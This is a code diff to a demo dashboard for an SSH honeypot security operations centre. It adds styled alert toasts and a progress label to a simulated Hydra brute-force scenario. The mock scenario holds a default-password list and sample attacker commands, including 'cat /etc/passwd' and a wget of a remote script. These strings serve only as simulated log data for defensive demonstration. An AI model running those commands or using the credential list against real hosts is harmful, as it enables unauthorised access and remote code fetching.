@@ -67,6 +67,7 @@ tbody tr:hover{background:#f6f8ff}
 .toast{background:#fff;border-left:4px solid #26a5e4;border-radius:10px;padding:10px 14px;font-size:13px;box-shadow:0 8px 24px #1e293b33;animation:tin .35s ease-out}
 .toast b{display:block;font-size:10.5px;letter-spacing:.6px;color:#26a5e4;margin-bottom:3px}
 .toast.blocked{border-left-color:#dc2626}.toast.blocked b{color:#dc2626}
+.toast.info{border-left-color:#7c3aed}.toast.info b{color:#7c3aed}
 @keyframes tin{from{transform:translateX(40px);opacity:0}to{transform:none;opacity:1}}
 </style></head><body><div id="toasts"></div>
 <nav><span class="logo">&#128737; HONEYPOT <span>SOC</span></span><a class="on" href="#top">Dashboard</a><a href="#att">Attackers</a><a href="#cred">Credentials</a><a href="#ev">Live events</a>
@@ -175,8 +176,8 @@ const USERS=["root","admin","ubuntu","user","test","oracle","pi","postgres","ftp
 const PWS=["123456","password","admin","root","toor","12345","qwerty","admin123","letmein","raspberry","1234","test"];
 const M={events:0,att:{},pw:{},us:{},recent:[],tl:{}};
 const hk=t=>new Date(t).toISOString().slice(0,13);
-function toast(text,blocked){const d=document.createElement("div");d.className="toast"+(blocked?" blocked":"");
- d.innerHTML="<b>"+(blocked?"TELEGRAM · BLOCK ALERT":"TELEGRAM · ALERT")+"</b>"+esc(text);
+function toast(text,blocked,title){const d=document.createElement("div");d.className="toast"+(blocked?" blocked":"")+(title?" info":"");
+ d.innerHTML="<b>"+(title||(blocked?"TELEGRAM · BLOCK ALERT":"TELEGRAM · ALERT"))+"</b>"+esc(text);
  $("toasts").appendChild(d);setTimeout(()=>d.remove(),6500);}
 function score(a){return Math.min(a.failed,30)+(a.failed>=10?25:0)+(a.success>0?20:0)+Math.min(a.cmds,10)*3+a.sus*15+a.dl*40;}
 function getAtt(ip,c){return M.att[ip]||(M.att[ip]={ip,country:c,failed:0,success:0,cmds:0,sus:0,dl:0,score:0,severity:"Low",blocked:false,alerted:false,live:false});}
@@ -198,14 +199,17 @@ let running=false;
 function scenario(){
  if(running)return;running=true;$("go").disabled=true;
  const ip="203.0.113.9",c="Kali VM (demo)";delete M.att[ip];
+ toast("Kali VM "+ip+" started an SSH brute force (Hydra) against the honeypot...",false,"ATTACK STARTED");
  const st=[()=>emit(ip,c,"cowrie.session.connect")];
  for(let i=0;i<32;i++)st.push(()=>emit(ip,c,"cowrie.login.failed","root",PWS[i%PWS.length]));
  st.push(()=>emit(ip,c,"cowrie.login.success","root","toor"));
  ["whoami","uname -a","cat /etc/passwd","wget http://example.com/x.sh"].forEach(m=>st.push(()=>emit(ip,c,"cowrie.command.input","root",null,m)));
  st.push(()=>emit(ip,c,"cowrie.session.file_download"));
  st.push(()=>{M.att[ip].live=false;toast("Reconnect from "+ip+" dropped by iptables (DOCKER-USER). Connection timeout.",true);});
- let i=0;(function nx(){if(i>=st.length){running=false;$("go").disabled=false;return;}
-  if(i===1)M.att[ip].live=true;st[i++]();setTimeout(nx,i<34?130:800);})();
+ const btn=$("go"),lbl=btn.innerHTML;
+ let i=0;(function nx(){if(i>=st.length){running=false;btn.disabled=false;btn.innerHTML=lbl;return;}
+  btn.textContent="Attack running... "+Math.round(i/st.length*100)+"%";
+  if(i===1)M.att[ip].live=true;st[i++]();setTimeout(nx,i<34?90:800);})();
 }
 function mockStats(){
  const list=Object.values(M.att),cty={};list.forEach(a=>bump(cty,a.country));
